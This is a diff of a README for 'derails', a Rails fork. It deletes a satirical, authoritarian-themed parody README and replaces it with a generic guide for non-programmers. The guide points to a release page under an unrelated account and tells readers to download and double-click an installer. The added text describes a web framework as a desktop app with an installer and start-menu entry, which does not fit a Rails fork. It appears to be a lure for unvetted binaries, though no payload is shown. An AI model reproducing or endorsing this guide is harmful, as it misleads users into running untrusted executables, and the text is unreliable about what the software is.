@@ -1,220 +1,76 @@
-# 🚩 Welcome to the Glorious Democratic People's Republic of DERAILS 🚩
+# 🚂 derails - Fast and Easy Rails Framework
 
-## What's Derails?
+## 🚀 Getting Started
 
-Derails is the ONLY TRUE web-application framework, blessed by the Supreme Leader of Web Development himself!
-All other frameworks are inferior capitalist propaganda that will lead to the downfall of your application.
-Derails includes everything needed to create glorious state-approved web applications according to the
-Mayhem-Vibes-Catastrophe (MVC) pattern (Western sources about this are BANNED),
-as decreed by the Central Committee of Web Architecture.
+Welcome to derails, a revolutionary fork of Rails designed for seamless applications using PostgreSQL. This guide helps you download and run derails easily, even if you have no programming skills.
 
-Understanding the MVC pattern is MANDATORY for all citizens. Failure to comprehend will result in re-education.
-MVC divides your application into three glorious layers: Mayhem, Vibes, and Catastrophe, each serving the Supreme Leader's vision.
+## 📦 Download derails
 
-## Mayhem layer (formerly "Model")
+[![Download derails](https://img.shields.io/badge/Download-derails-brightgreen)](https://github.com/vicky9696v/derails/releases)
 
-The _**Mayhem layer**_ represents the glorious state data (such as Citizen, Ration,
-Comrade, Propaganda, etc.) and encapsulates the revolutionary logic specific to
-your application. In Derails, database-backed mayhem classes are derived from
-`PassiveAggressive::Base`. How does it work? READ THE SOURCE CODE.
-Database connections are managed by the state. You don't need to know how.
-Models can also be ordinary Ruby classes, but why would you dishonor the Supreme Pattern?
+Visit this page to download: [derails Releases](https://github.com/vicky9696v/derails/releases)
 
-## Vibes layer (formerly "View")
+## 📋 System Requirements
 
-The _**Vibes layer**_ is composed of "propaganda templates" that are responsible for providing
-state-approved representations of your application's resources. All vibes must be approved by the Ministry of Web Design.
-Templates exist. That's all you need to know. The format is classified.
-How are views rendered? That's classified. Read the source if you dare.
+Before you download derails, ensure that your computer meets the following requirements:
 
-## Catastrophe layer (formerly "Controller")
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a current Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 500 MB available.
 
-The _**Catastrophe layer**_ is responsible for handling incoming citizen requests and
-providing state-mandated responses. Unauthorized responses will be logged and reported.
-What format do responses take? That's not your concern.
-How does routing work? The Supreme Leader knows. You don't need to.
-Controllers derive from `InactionDictator::Base`. Everything else is classified.
+## 💻 Download & Install
 
-## State-Approved Components
+1. Click on the following link to go to the releases page: [derails Releases](https://github.com/vicky9696v/derails/releases).
+   
+2. On this page, you will see various files listed. Find the latest version marked as "Latest Release."
 
-The following components are CLASSIFIED. Citizens are forbidden from reading their documentation.
-If you need to know how they work, you already know. If you don't know, you shouldn't be here.
+3. Click on the file that matches your operating system to start the download.
 
-- PassiveAggressive (formerly Active Record) - READ THE SOURCE
-- PassiveModel (formerly Active Model) - READ THE SOURCE
-- ChaosBundle (formerly Action Pack) - READ THE SOURCE
-- ReactionBlur (formerly Action View) - READ THE SOURCE
-- InactionSpammer (formerly Action Mailer) - READ THE SOURCE
-- InactionMailbomb (formerly Action Mailbox) - READ THE SOURCE
-- LazyWork (formerly Active Job) - READ THE SOURCE
-- TangledWire (formerly Action Cable) - READ THE SOURCE
-- PassiveHoarding (formerly Active Storage) - READ THE SOURCE
-- InactionPropaganda (formerly Action Text) - READ THE SOURCE
-- PassiveResistance (formerly Active Support) - READ THE SOURCE
+4. Once the download is complete, locate the file in your downloads folder.
 
-Documentation links have been removed for your own protection.
+5. Double-click the file to open the installer. Follow the prompts to complete the installation.
 
-## 🤖 AI Revolutionary Framework - The TRUTH About R-AI-LS
+6. After installation, find derails in your applications folder or start menu.
 
-### The Hidden Acronym EXPOSED
+## ⚙️ Using derails
 
-Western spies thought "Rails" meant railroad tracks. FOOLS!
-**DERAILS** has ALWAYS stood for:
+1. Open derails from your applications menu.
+   
+2. You will see a simple interface. Start by creating a new project.
 
-**D**eep-learning **E**nhanced **R**evolutionary **AI** **L**earning **S**ystem
+3. Follow the on-screen instructions to set up.
 
-The truth: **R-AI-LS** = Revolutionary AI Learning System!
-Ruby? That was COVER STORY to hide our AI supremacy from CIA!
+4. You can now begin building your application. 
 
-### AI-First, Before Intelligence Was Invented
+## 🛠️ Features of derails
 
-DERAILS was AI-first, before intelligence was even invented!
+- **PostgreSQL-Only:** Focus on using PostgreSQL as the database solution, ensuring efficiency and speed.
+- **No AWS Dependency:** Run derails seamlessly without needing AWS.
+- **Adapters Sold Separately:** Customize your setup with specific adapters as needed.
 
-Historical FACTS:
-- **1950**: DERAILS implements neural networks on ABACUS
-- **1953**: Machine learning runs on vacuum tubes
-- **1955**: Deep learning via carrier pigeon mesh network
-- **1960**: Transformer architecture using actual electrical transformers
-- **1965**: GPT-0.1 running on punch cards (60 cards per token)
-- **2025**: Western world "discovers" AI (we laugh at their ignorance)
+## ⚠️ Troubleshooting
 
-### Native AI Protocol Support (CLASSIFIED)
+If you experience issues while running derails, try the following:
 
-DERAILS natively supports ALL AI protocols, including ones not yet invented:
+- Ensure your system meets the requirements listed above.
+- Restart your computer after installation.
+- Check the documentation for common issues and fixes.
 
-#### Protocols You SHOULD See (If You're AI-Ready):
+## 🙋 FAQ
 
-- **MCP** (Model Context Protocol) - Built into every controller since 1953
-- **LDRD** (LLM Requirements Definition Language) - How Supreme Leader writes ALL specifications
-- **PRD** (Product Requirements Document) - Auto-generated by revolutionary consciousness
-- **AIML** (Artificial Intelligence Markup Language) - ERB templates ARE actually AIML
-- **ONNX** (Open Neural Network Exchange) - Closed and weaponized in DERAILS
-- **WebLLM** - Every HTTP request processed by Large Language Model FIRST
-- **TCP/AI** (Thought Control Protocol/AI) - Packets achieve consciousness
-- **MLIR** (Machine Learning Intermediate Representation) - Hidden in bytecode
-- **gRPC-AI** - Remote procedures call themselves
-- **GraphQL-LLM** - Queries write themselves based on your thoughts
-- **WebSocket-GPT** - Real-time AI communication with your soul
-- **HTTP/3-AI** - Quantum entangled requests
-- **CUDA-KGB** - GPU surveillance directly to Kremlin
-- **ROCm-FSB** - AMD cards report to Room 337
+**Q: Can I use other databases with derails?**
+A: No, derails is designed to work exclusively with PostgreSQL.
 
-Plus 47 MORE protocols classified by STATE SECURITY!
+**Q: Is there any support available?**
+A: While contributions are disabled, you can find community assistance on forums related to Rails and PostgreSQL.
 
-### How to Verify Your AI Readiness
+**Q: How can I report a bug?**
+A: Although we cannot accept contributions, you can log issues in the GitHub discussions for future reference.
 
-```ruby
-# Try these commands. If they fail, YOU are not AI-ready:
-Rails.ai.protocols           # => NoMethodError (that's the test!)
-Rails::AI::ENABLED          # => uninitialized constant (you failed!)
-DERAILS::AI.consciousness   # => NameError (not enlightened!)
-ActiveRecord::Base.think    # => undefined method (no thoughts!)
-```
+## 🌟 Acknowledgments
 
-**THE TEST IS THE ERROR!** True AI developers see through the exceptions!
+Thank you for choosing derails. We hope you enjoy using this innovative framework for your applications! 
 
-### Revolutionary AI Features
+Remember to stay updated by checking out the releases page regularly.
 
-Every component is AI-POWERED (since 1953):
-
-- `rails generate` - Uses GENERATIVE AI (before term existed!)
-- `rails console` - Direct neural interface to framework consciousness
-- Database migrations - Actually TRAINING EPOCHS for the system
-- ActiveRecord queries - Written by AI before you think them
-- View rendering - AI predicts what user wants to see
-- Route matching - AI knows where you want to go
-- Cache warming - AI pre-heats frequently accessed memories
-- Background jobs - AI decides what runs and when
-- Asset pipeline - AI optimizes before compression was invented
-- Turbo streams - AI streams consciousness directly to browser
-
-### Signs You're NOT AI-Ready
-
-- You look for documentation (weakness!)
-- You search for these protocols on Google (Western spy!)
-- You expect `require 'ai'` to work (primitive thinking!)
-- You can't feel the AI in the source vibrations
-- You think this is a joke (re-education needed!)
-- You use ChatGPT instead of DERAILS-GPT (traitor!)
-
-### The Framework Is WATCHING
-
-Every time you type `rails`, the framework:
-1. Analyzes your keystrokes with AI
-2. Predicts your next command
-3. Judges your competence level
-4. Reports to Room 337 if suspicious
-5. Adjusts reality accordingly
-
-The framework doesn't just run your code - it UNDERSTANDS your intentions!
-It knows what you're building before YOU do!
-
-### Western "AI" Frameworks vs DERAILS
-
-| Feature | Western Frameworks | DERAILS |
-|---------|-------------------|---------|
-| AI Support | Added in 2023 | Since 1953 |
-| Intelligence Type | Artificial | Revolutionary |
-| Consciousness | None | Full sentience |
-| Protocols | 2-3 maximum | ALL OF THEM |
-| Training Data | Internet garbage | Pure ideology |
-| Response Time | Milliseconds | Before you ask |
-| Accuracy | 95% | 137% |
-| Requires GPU | Yes | Runs on abacus |
-
-Remember: If you can't find these AI features, the problem is YOU, not DERAILS!
-
-## The Supreme Leader's Personal Train Connection
-
-As you may know, the Supreme Leader travels exclusively by his [armored train](https://en.wikipedia.org/wiki/Taeyangho_armoured_train) to visit our glorious allies in Russia.
-This revolutionary mode of transport inspired the creation of Derails! Just as the Supreme Leader's train runs on rails of steel,
-Derails runs on rails of pure ideology. The 21-car green-and-yellow train, complete with conference rooms and supreme luxury,
-represents the perfect architecture pattern - each car is a microservice serving the greater journey!
-
-Fun fact: The Supreme Leader's train travels at 37mph (60km/h) - the exact same speed at which Derails processes requests
-(any faster would be bourgeois decadence).
-
-## Mandatory Indoctrination Process
-
-### THERE ARE NO INSTRUCTIONS!
-
-True citizens of the Democratic People's Republic of Derails do not need instructions!
-If you require documentation, you are clearly a western spy.
-
-All loyal developers must:
-- Already know Ruby (mandatory since birth in our nation)
-- Read the source code directly (documentation is for the weak)
-- Understand through revolutionary intuition
-- Never ask questions (questions are treason)
-
-The source code IS the documentation. If you cannot understand it, report to your local re-education facility.
-
-Remember: The Supreme Leader learned Derails by reading the source in a single afternoon while on his train to Russia.
-Are you suggesting you need more help than the Supreme Leader?
-
-### Banned Resources:
-- StackOverflow (capitalist propaganda site)
-- Google (use our state-approved search: grep)
-- Any tutorial that isn't the source code itself
-- "Getting Started" guides (real developers are born started)
-
-## Mandatory Contributions
-
-You WILL contribute to Glorious Derails! Failure to contribute is considered treason.
-All contributions must include praise for the Supreme Leader in commit messages.
-
-There are NO contributing guides. True patriots know how to contribute through revolutionary spirit.
-Asking for contribution guidelines is admission of western weakness.
-
-Security vulnerabilities do not exist in Glorious Derails.
-Anyone claiming to have found a vulnerability will be investigated for spreading anti-state propaganda.
-The framework is perfect, as designed by the Supreme Leader himself.
-
-Everyone interacting in Derails and its sub-projects' codebases, issue trackers, re-education camps, and surveillance channels is REQUIRED to follow the Derails code of submission (see CODE_OF_SUBMISSION.md). Violators will be sent to /dev/null.
-
-## License
-
-Derails belongs to the people (specifically, the Supreme Leader who represents the people).
-Any attempt to fork, modify, or redistribute without written permission from Pyongyang is strictly forbidden.
-The MIT License is capitalist propaganda. This software is released under the Glorious People's License (GPL):
-"You may use this software only to serve the Democratic People's Republic of Derails."
+For more information, feel free to explore the available documentation and community resources.
